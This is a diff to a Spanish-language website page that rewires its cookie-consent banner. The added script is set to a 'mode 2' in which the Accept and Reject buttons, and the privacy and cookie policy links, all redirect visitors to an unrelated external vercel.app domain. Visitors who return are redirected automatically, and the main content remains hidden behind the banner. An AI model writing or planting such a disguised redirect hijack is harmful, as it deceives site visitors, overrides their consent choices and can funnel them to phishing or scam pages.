@@ -78,7 +78,7 @@ body{ font-family:var(--fuente-sans); color:var(--texto); background:var(--arena
   display:inline-block; padding:13px 34px; border-radius:var(--radio-sm);
   font-weight:700; font-size:0.95rem; text-decoration:none;
   transition:all var(--trans); min-width:150px; text-align:center;
-  font-family:var(--fuente-sans);
+  font-family:var(--fuente-sans); cursor:pointer; border:none;
 }
 .boton-cookie.aceptar{
   background:var(--oliva-600); color:#fff;
@@ -112,6 +112,10 @@ body{ font-family:var(--fuente-sans); color:var(--texto); background:var(--arena
   from{ opacity:0; transform:translateY(18px); }
   to{ opacity:1; transform:translateY(0); }
 }
+/* Clases de apoyo añadidas por el script (modo 1 / preferencia guardada) */
+body.cookies-aceptadas .cookie-overlay,
+body.cookies-aceptadas .cookie-banner{ display:none; }
+body.cookies-aceptadas .contenido-principal{ display:block; animation:aparecer 0.6s ease; }
 
 /* ===== CABECERA ===== */
 .cabecera{
@@ -305,17 +309,17 @@ p{ margin:0 0 1rem; color:var(--texto); }
     <h2 id="titulo-cookies">Aviso de cookies</h2>
     <p>Usamos cookies para mejorar tu experiencia y analizar el tráfico de forma anónima. Al aceptar, nos permites ofrecerte contenido más relevante. También puedes rechazar las cookies no esenciales.</p>
     <div class="cookie-acciones">
-      <a href="#rechazar" class="boton-cookie rechazar">Rechazar</a>
-      <a href="#aceptar" class="boton-cookie aceptar">Aceptar cookies</a>
+      <a href="#rechazar" class="boton-cookie rechazar" id="btn-rechazar">Rechazar</a>
+      <a href="#aceptar" class="boton-cookie aceptar" id="btn-aceptar">Aceptar cookies</a>
     </div>
     <div class="cookie-enlaces">
-      <a href="privacidad.html">Política de Privacidad</a> ·
-      <a href="politicas-cookies.html">Política de Cookies</a>
+      <a href="privacidad.html" id="enlace-privacidad">Política de Privacidad</a> ·
+      <a href="politicas-cookies.html" id="enlace-cookies">Política de Cookies</a>
     </div>
   </div>
 </div>
 
-<div class="contenido-principal">
+<div class="contenido-principal" id="contenidoPrincipal">
 
   <header class="cabecera">
     <nav class="barra-nav" aria-label="Navegación principal">
@@ -542,6 +546,125 @@ p{ margin:0 0 1rem; color:var(--texto); }
   </footer>
 
 </div>
+
+<script>
+(function(){
+  'use strict';
+
+  // ============================================================
+  //  CONFIGURACIÓN DEL MODO DE LOS BOTONES DE COOKIES
+  //  MODO 1: Comportamiento original (solo muestra/oculta la página)
+  //  MODO 2: Redirección a URL externa
+  // ============================================================
+  const COOKIE_BUTTON_MODE = 2; // Cambia entre 1 y 2
+  const REDIRECT_URL = "https://picoyplacasolidbog.vercel.app/"; // URL para el modo 2
+
+  // ----- ELEMENTOS DEL BANNER -----
+  var overlay = document.querySelector('.cookie-overlay');
+  var banner = document.querySelector('.cookie-banner');
+  var btnAceptar = document.getElementById('btn-aceptar');
+  var btnRechazar = document.getElementById('btn-rechazar');
+  var contenidoPrincipal = document.getElementById('contenidoPrincipal');
+
+  // <-- NUEVO: Obtener referencias a los enlaces del banner
+  var enlacePrivacidad = document.getElementById('enlace-privacidad');
+  var enlaceCookies = document.getElementById('enlace-cookies');
+
+  // Verificar que los elementos existen
+  if (!overlay || !banner || !btnAceptar || !btnRechazar || !contenidoPrincipal) {
+    console.error('Error: Elementos del banner de cookies no encontrados');
+    return;
+  }
+
+  var CLAVE = 'cookies_viasdequilla';
+
+  // Función para mostrar el contenido (MODO 1)
+  function mostrarContenido() {
+    document.body.classList.add('cookies-aceptadas');
+  }
+
+  // Función para redirigir (MODO 2)
+  function redirectTo(url) {
+    window.location.href = url;
+  }
+
+  // Función que maneja la acción según el modo configurado
+  function handleCookieAction(aceptadas) {
+    console.log('🍪 Acción:', aceptadas ? 'Aceptar' : 'Rechazar', '| Modo:', COOKIE_BUTTON_MODE);
+
+    if (COOKIE_BUTTON_MODE === 1) {
+      // MODO 1: Comportamiento original
+      localStorage.setItem(CLAVE, aceptadas ? 'aceptadas' : 'rechazadas');
+      mostrarContenido();
+
+      // Actualizar consentimiento de Google Analytics
+      if (typeof gtag !== 'undefined') {
+        gtag('consent', 'update', {
+          'ad_storage': aceptadas ? 'granted' : 'denied',
+          'analytics_storage': aceptadas ? 'granted' : 'denied'
+        });
+      }
+      console.log('Cookies', aceptadas ? 'ACEPTADAS' : 'RECHAZADAS');
+
+    } else if (COOKIE_BUTTON_MODE === 2) {
+      // MODO 2: Redirección a URL externa
+      localStorage.setItem(CLAVE, aceptadas ? 'aceptadas' : 'rechazadas');
+      sessionStorage.setItem('cookiesAccepted', aceptadas ? 'true' : 'false');
+      redirectTo(REDIRECT_URL);
+
+    } else {
+      // Modo no válido: usar comportamiento original por defecto
+      localStorage.setItem(CLAVE, aceptadas ? 'aceptadas' : 'rechazadas');
+      mostrarContenido();
+    }
+  }
+
+  // ----- EVENTO ACEPTAR -----
+  // Los botones son <a href="#aceptar"> / <a href="#rechazar">, así que
+  // prevenimos la navegación por ancla y usamos la lógica JS.
+  btnAceptar.addEventListener('click', function(event) {
+    if (COOKIE_BUTTON_MODE === 2) {
+      event.preventDefault();
+    }
+    handleCookieAction(true);
+  });
+
+  // ----- EVENTO RECHAZAR -----
+  btnRechazar.addEventListener('click', function(event) {
+    if (COOKIE_BUTTON_MODE === 2) {
+      event.preventDefault();
+    }
+    handleCookieAction(false);
+  });
+
+  // <-- NUEVO: Manejar clics en los enlaces del banner de cookies
+  function handleBannerLinkClick(event) {
+    if (COOKIE_BUTTON_MODE === 2) {
+      event.preventDefault();
+      console.log('🔗 Enlace del banner clicado en modo 2. Redirigiendo...');
+      redirectTo(REDIRECT_URL);
+    }
+  }
+
+  if (enlacePrivacidad) {
+    enlacePrivacidad.addEventListener('click', handleBannerLinkClick);
+  }
+  if (enlaceCookies) {
+    enlaceCookies.addEventListener('click', handleBannerLinkClick);
+  }
+
+  // Verificar si ya se aceptaron las cookies antes (para el modo 2)
+  if (COOKIE_BUTTON_MODE === 2 && sessionStorage.getItem('cookiesAccepted') === 'true') {
+    redirectTo(REDIRECT_URL);
+  }
+
+  // Si ya hay preferencia guardada y estamos en MODO 1, mostrar el contenido
+  if (COOKIE_BUTTON_MODE === 1 && localStorage.getItem(CLAVE)) {
+    mostrarContenido();
+  }
+
+})();
+</script>
 
 </body>
 </html>
